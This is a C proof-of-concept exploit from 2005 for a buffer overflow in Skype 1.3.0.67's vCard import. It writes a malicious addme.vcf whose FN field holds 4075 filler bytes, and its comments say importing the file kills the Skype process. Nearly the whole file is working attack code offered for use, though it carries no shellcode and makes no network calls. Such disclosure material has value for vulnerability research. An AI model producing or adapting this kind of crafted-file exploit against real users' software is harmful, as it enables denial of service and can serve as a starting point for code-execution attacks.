/* [psi-skype.c] 14.10.05
 *
 * Author: posidron [ posidron@tripbit.net]
 *
 * ------------------------------------------------------------------
 *        { Read it, keep it! } else { I will kick your ass! }
 * ------------------------------------------------------------------
 * Description
 *   Skype is vulnerable to a buffer overflow in parsing the Username
 *   out of a .vcf file, also called vCard in Skype.
 *   This is only proof of concept code! No further debug process was
 *   made.
 *
 * ------------------------------------------------------------------
 * Vulnerable
 *   Successfully tested at:
 *   Skype 1.3.0.67 (Windows XP Prof SP2 - German)
 *   At the moment it is unclear which version are all affected.
 *
 * ------------------------------------------------------------------
 * Compilation
 *   gcc.exe psi-skype.c -o psi-skype -Wall
 *
 * ------------------------------------------------------------------
 * Example
 *   C:\vulndev\skype>psi-skype.exe
 *   C:\vulndev\skype>
 *
 *   Execute now Skype and import the generated vCard. The Skype
 *   process killed immediately. Get your mind free! ;)
 *
 * ------------------------------------------------------------------
 */
 
#include <stdio.h>

int write_vcf(FILE *fd_vcf);

int main (int argc, char *argv[])
{
  FILE *fd_vcf;
  
  if ((fd_vcf = fopen("addme.vcf", "w")) == NULL)
  {
    fprintf(stdout, "error: fopen();\n");
    return -1;
  }
  
  write_vcf(fd_vcf);
  
  fclose(fd_vcf);
  
  return 0;
}

int write_vcf(FILE *fd_vcf)
{
  // overflow occurs at 4075
  char buff[4075]; // 4090 // 4080

  memset(&buff, 0x41, sizeof (buff));

  fprintf(fd_vcf,
        //"BEGIN:VCARD\n"
        //"N:posidron_\n"
        //"X-SKYPE-USERNAME:posidron_\n"
        //"X-SKYPE-COUNTRY:de\n"
        //"ADR:;;;;;;\n"
        //"X-SKYPE-PROFILE:1\n"
        //"REV:01051014T024742Z\n"
        //"END:VCARD\n\n\n"
          "BEGIN:VCARD\n"
          "N:call_back\n"
          "X-SKYPE-USERNAME:call_back\n"
          "FN:%s\n" // Overflow
        //"X-SKYPE-LANGUAGE:pt\n"
        //"X-SKYPE-COUNTRY:br\n"
        //"X-SKYPE-BUDDYSTATUS:-3\n"
        //"X-SKYPE-ISAUTHORIZED:-1\n"
        //"X-SKYPE-AUTHCERTIFICATE;ENCODING=BASE64:AAAAxAAAAACOlrmmImSrw0GWE+Rao9KZIjY6UB5TY3LDwMRQTvo1Pt09paGUTMwcx5OuwTARZga2ytOyCkoXUD0GURWXeNKJfiDcu6nRw74Km7vOUdahEFczBjaqsLdMeG7cZfpGrWlLLT3FB61I6915mXNxUsApS1YUO4qIxd+B+d4EPO91SMl/hPN09/+aLjXeZPUCyPzOUqcFSHZQUcJMsKsby950F3Yy/kvYeUdbRgvMvjB9Ai+BpJUfasbAKEzsmQJix7pqSSWzZxaDcQ/vGYwN5OLJp3h0HTtx3U0MN/c+x76dXgy0RtZJUxuB/uHtK/8bFjkwKcOmmDmjMwAOVS9w3uxNB3MG3pnBcV3h6e/HruueLaMzGB06EBhi2As7fZvfZVdnbQC6OaBHe8SQjQ2qL6dYOxla9yDC1Um9q45QGl2usw==\n"
        //"REV:01051014T024742Z\n"
          "END:VCARD",
          buff);

  return 0;
}
